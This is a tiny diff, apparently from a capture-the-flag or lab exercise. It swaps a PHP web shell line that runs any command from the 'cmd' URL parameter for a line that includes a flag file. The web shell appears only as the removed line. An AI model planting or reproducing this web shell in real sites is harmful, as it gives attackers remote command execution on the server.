@@ -1,1 +1,1 @@
-<?php system($_GET["cmd"]); ?>
+<?php include("flag.txt"); ?>
